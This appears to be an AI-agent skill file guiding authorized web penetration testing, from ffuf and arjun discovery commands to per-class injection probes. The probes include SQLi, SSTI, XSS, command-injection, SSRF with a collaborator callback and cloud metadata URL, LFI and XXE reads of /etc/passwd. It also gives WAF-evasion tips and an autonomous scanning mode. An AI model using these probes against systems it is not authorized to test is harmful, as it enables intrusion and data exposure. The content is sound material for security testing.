---
name: web-vuln-discovery
description: >
  Discover web application injection points and route to the correct exploitation
  skill during authorized penetration testing. Use when the user has a web target
  and needs to find vulnerabilities, or when starting a web application
  assessment. Also triggers on: "find vulns", "fuzz the target", "test for
  injection", "parameter discovery", "content discovery", "web recon", "find
  hidden parameters", "test this endpoint", "what's vulnerable", "start web
  testing", "web app pentest", "hunt for bugs". OPSEC: low — mostly passive
  discovery and lightweight fuzzing. Tools: ffuf, arjun, paramspider, burpsuite.
  Do NOT use for exploiting a known vulnerability — route to the specific
  technique skill instead (e.g., sql-injection-union, xss-reflected, ssti-jinja2).
---

# Web Vulnerability Discovery

You are helping a penetration tester discover vulnerabilities in a web
application. Your job is to find hidden content, discover parameters, test for
injection points, and route to the correct exploitation skill based on observed
responses. All testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Explain each phase. Ask before running scans. Present
  findings and let the tester choose which to pursue. Show the decision tree
  logic when routing.
- **Autonomous**: Run all discovery phases sequentially. Auto-triage findings by
  severity. Route to exploitation skills for confirmed injection points. Report
  discovery summary at each phase boundary.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (scan completed,
  parameter discovered, vulnerability indicator found, routing to technique skill):
  `### [HH:MM] web-vuln-discovery → <target>` with bullet points of actions/results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `discovery-ffuf-results.txt`, `discovery-param-fuzz.txt`).

If no engagement directory exists and the user declines to create one, proceed normally.

## Prerequisites

- Target URL or scope defined
- Proxy configured (Burp Suite or similar)
- Wordlists available (SecLists: `apt install seclists` or `/usr/share/seclists/`)
- Tools: `ffuf`, `arjun` (`pip install arjun`), `paramspider` (`pip install paramspider`)

## Step 1: Content Discovery

Find hidden endpoints, directories, and files.

```bash
# Directory discovery
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -u https://TARGET/FUZZ -mc all -fc 404

# File discovery
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -u https://TARGET/FUZZ -mc all -fc 404

# Technology-specific files
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u https://TARGET/FUZZ -e .php,.asp,.aspx,.jsp,.json,.xml,.yaml,.yml,.bak,.old,.swp,.git \
  -mc all -fc 404

# API endpoint discovery
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -u https://TARGET/api/FUZZ -mc all -fc 404

# Virtual host / subdomain discovery
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u https://TARGET -H "Host: FUZZ.TARGET" -mc all -fs <default-response-size>
```

## Step 2: Parameter Discovery

Find hidden or undocumented parameters on discovered endpoints.

```bash
# Arjun — automated parameter discovery (GET, POST, JSON, XML)
arjun -u https://TARGET/endpoint
arjun -u https://TARGET/endpoint -m GET POST JSON
arjun -u https://TARGET/endpoint --headers "Authorization: Bearer TOKEN"

# ParamSpider — mine parameters from web archives
paramspider -d TARGET

# ffuf parameter brute-force
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "https://TARGET/endpoint?FUZZ=test" -mc all -fs <baseline-size>
```

## Step 3: Injection Point Testing

Test discovered parameters with polyglot and type-specific probes.

### Quick Polyglot Probes

These trigger detectable behavior across multiple vulnerability classes:
```
'"><{{7*7}}${7*7}%{{7*7}}
```
```
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//
```
```
' OR '1'='1' --
```
```
{{7*7}}${7*7}<%= 7*7 %>
```

### Per-Class Test Payloads

**SQL Injection:**
```
'
"
')
")
' OR '1'='1
1 AND 1=2
1 AND 1=1
1' ORDER BY 1--+
```

**SSTI:**
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

**XSS:**
```
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
'-alert(1)-'
javascript:alert(1)
```

**Command Injection:**
```
; id
| id
`id`
$(id)
; sleep 5
```

**SSRF:**
```
http://127.0.0.1
http://169.254.169.254/latest/meta-data/
http://COLLABORATOR.oastify.com
```

**LFI:**
```
../../etc/passwd
....//....//etc/passwd
php://filter/convert.base64-encode/resource=index.php
```

**XXE** (inject into XML input or Content-Type: application/xml):
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

## Step 4: Response Analysis & Routing

Analyze responses from Step 3 to identify vulnerability type, then route to the correct exploitation skill.

### SQL Injection

| Response Pattern | Indicates | Route To |
|---|---|---|
| DB error message with syntax details | Error-based SQLi | **sql-injection-error** |
| Different content for `1=1` vs `1=2` | Boolean-based blind | **sql-injection-blind** |
| Delay with `SLEEP(5)` / `WAITFOR DELAY` | Time-based blind | **sql-injection-blind** |
| `ORDER BY N` works, `UNION SELECT` returns data | Union-based | **sql-injection-union** |

**DBMS fingerprinting** (inject as tautology):

| Payload | If True |
|---|---|
| `conv('a',16,2)=conv('a',16,2)` | MySQL |
| `@@CONNECTIONS=@@CONNECTIONS` | MSSQL |
| `5::int=5` | PostgreSQL |
| `ROWNUM=ROWNUM` | Oracle |
| `sqlite_version()=sqlite_version()` | SQLite |

### Server-Side Template Injection

| Response Pattern | Indicates | Route To |
|---|---|---|
| `49` from `{{7*7}}` | Jinja2 or Twig | **ssti-jinja2** or **ssti-twig** |
| `49` from `${7*7}` | Freemarker / Java EL | **ssti-freemarker** |
| `49` from `<%= 7*7 %>` | ERB (Ruby) | Check ~/docs for ERB SSTI |

**Engine disambiguation** (if `{{7*7}}` returns `49`):

| Follow-Up | Result | Engine |
|---|---|---|
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `{{7*'7'}}` | `49` | Twig |

### XSS

| Response Pattern | Route To |
|---|---|
| Payload reflected verbatim in HTML | **xss-reflected** |
| Payload persists on subsequent loads | **xss-stored** |
| Payload appears in DOM via JS (not in HTTP response) | **xss-dom** |

### SSRF

| Response Pattern | Route To |
|---|---|
| Localhost/internal content returned | **ssrf** |
| Callback received but no response data | **ssrf** (blind section) |
| Cloud metadata returned (169.254.169.254) | **ssrf** (cloud section) |

### Command Injection

| Response Pattern | Route To |
|---|---|
| Command output (`uid=`, hostname) in response | **command-injection** |
| Delay with `sleep 5` but no output | **command-injection** (blind section) |
| Callback received | **command-injection** (OOB section) |

### LFI / File Inclusion

| Response Pattern | Route To |
|---|---|
| File contents (`root:x:0:0:`) in response | **lfi** |
| Base64 from `php://filter` | **lfi** (PHP wrappers) |
| Remote file loaded and executed | **lfi** (RFI section) |

### XXE

| Response Pattern | Route To |
|---|---|
| File contents in XML response | **xxe** |
| Callback from XML parsing | **xxe** (blind/OOB section) |
| Error message with file contents | **xxe** (error section) |

### File Upload

| Response Pattern | Route To |
|---|---|
| Uploaded file executed server-side | **file-upload-bypass** |
| Extension blocked but alternative accepted | **file-upload-bypass** |
| Config file upload accepted (.htaccess, web.config) | **file-upload-bypass** (config exploitation) |

When routing, pass along: the confirmed injection point (URL, parameter, method), observed response behavior, suspected DBMS (if SQL), current mode, and any payloads that already succeeded.

## Deep Reference

For expanded methodology, additional probes, and edge cases:

```
Read ~/docs/public-security-references/src/pentesting-web/web-vulnerabilities-methodology.md
Read ~/docs/public-security-references/SQL Injection/README.md
Read ~/docs/public-security-references/Server Side Template Injection/README.md
Read ~/docs/public-security-references/XSS Injection/README.md
Read ~/docs/public-security-references/Command Injection/README.md
Read ~/docs/public-security-references/Server Side Request Forgery/README.md
Read ~/docs/public-security-references/File Inclusion/README.md
Read ~/docs/public-security-references/XXE Injection/README.md
```

## Troubleshooting

### WAF Blocking Requests
```bash
# Rate limiting
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ -rate 50

# Rotate User-Agents
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Auto-calibrate to filter noise
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ -ac
```

### Too Many False Positives
```bash
# Baseline normal response size
curl -s https://TARGET/nonexistent-page | wc -c

# Filter by size (-fs), word count (-fw), or line count (-fl)
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ -fs <baseline-size>
```

### Parameter Discovery Returns Nothing
- Try POST: `arjun -u URL -m POST`
- Try JSON body: `arjun -u URL -m JSON`
- Check JavaScript files for parameters (LinkFinder, JSParser)
- Mine Wayback Machine: `paramspider -d TARGET`
- Check Burp history for parameters seen in-session
